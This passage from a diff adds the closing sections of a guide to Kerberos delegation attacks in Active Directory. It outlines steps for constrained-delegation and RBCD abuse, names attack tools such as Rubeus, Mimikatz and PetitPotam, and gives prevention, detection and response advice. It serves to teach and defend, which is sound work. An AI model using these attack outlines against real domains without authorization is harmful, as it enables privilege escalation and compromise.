+**Constrained Delegation Attack:**
+```
+1. Discover accounts with constrained delegation
+2. Compromise service account
+3. Request TGT for service account
+4. Use S4U to impersonate privileged user
+5. Request alternative service tickets
+6. Access broader range of services
+```
+
+**RBCD Attack:**
+```
+1. Find GenericWrite on computer objects
+2. Create or control computer account
+3. Configure RBCD on target
+4. Use S4U to impersonate any user to target
+5. Access target with full privileges
+```
+
+### Defense in Depth
+
+**Prevention:**
+- Remove unconstrained delegation (except DCs)
+- Restrict constrained delegation targets
+- Disable protocol transition where possible
+- Set MachineAccountQuota to 0
+- Audit and restrict ACLs on computer objects
+- Use Protected Users group
+- Set "Account is sensitive and cannot be delegated"
+
+**Detection:**
+- Monitor Event IDs 4768, 4769, 5136
+- Alert on S4U2Self and S4U2Proxy
+- Detect RBCD configuration changes
+- Monitor for alternative service requests
+- Track coercion attack indicators
+- Behavioral analysis of delegation usage
+
+**Response:**
+- Disable compromised accounts immediately
+- Remove RBCD configurations
+- Delete suspicious computer accounts
+- Reset passwords
+- Rotate krbtgt (if DC compromised)
+- Conduct thorough investigation
+- Implement lessons learned
+
+### Tools Mastery Checklist
+
+**Essential Tools:**
+- ☐ Rubeus - S4U operations, ticket manipulation
+- ☐ PowerView - Delegation enumeration
+- ☐ Impacket (getST.py, addcomputer.py, rbcd.py)
+- ☐ Mimikatz - Credential extraction, DCSync
+- ☐ PowerMad - Computer account creation
+- ☐ BloodHound - Attack path analysis
+- ☐ SpoolSample/PetitPotam - Coercion attacks
+
+**Skill Validation:**
+- ☐ Enumerate all delegation types
+- ☐ Exploit unconstrained delegation
+- ☐ Perform S4U2Self and S4U2Proxy attacks
+- ☐ Execute alternative service attacks
+- ☐ Configure and exploit RBCD
+- ☐ Detect delegation attacks in logs
+- ☐ Remediate delegation misconfigurations
+- ☐ Implement protective controls
+
+### Best Practices
+
+**For Red Teamers:**
+- Always get proper authorization
+- Document all delegation configurations found
+- Understand business impact of exploitation
+- Provide detailed remediation guidance
+- Clean up created computer accounts
+- Help defenders improve security posture
+
+**For Blue Teamers:**
+- Regular delegation audits (quarterly minimum)
+- Remove unconstrained delegation
+- Minimize protocol transition usage
+- Set MachineAccountQuota to 0
+- Monitor RBCD changes in real-time
+- Use Protected Users group extensively
+- Implement comprehensive logging and monitoring
+
+**For Organizations:**
+- Assume compromise of service accounts
+- Implement least privilege for delegation
+- Regular security assessments
+- Segregate privileged accounts
+- Defense-in-depth approach
+- Incident response preparedness
+- Security awareness training on delegation risks
+
+### Final Thoughts
+
+Kerberos delegation attacks represent **critical privilege escalation vectors** in Active Directory. They demonstrate:
+
+1. **Configuration is critical** - Default and legacy settings are dangerous
+2. **Service accounts are high-value targets** - Often over-privileged
+3. **Defense requires multiple layers** - No single control prevents all attacks
+4. **Monitoring is essential** - Prevention alone is insufficient
+5. **Regular audits matter** - Delegation configurations often forgotten
+
+**Remember:** The most secure delegation is no delegation. Remove delegation configurations unless absolutely required, and when required, use the most restrictive configuration possible (constrained without protocol transition, specific services only).
+
+**Delegation Security Hierarchy (Most to Least Secure):**
+1. No delegation
+2. Constrained delegation (Kerberos only, specific services)
+3. Constrained delegation (protocol transition, specific services)
+4. Resource-Based Constrained Delegation (carefully configured)
+5. Unconstrained delegation (avoid completely except DCs)
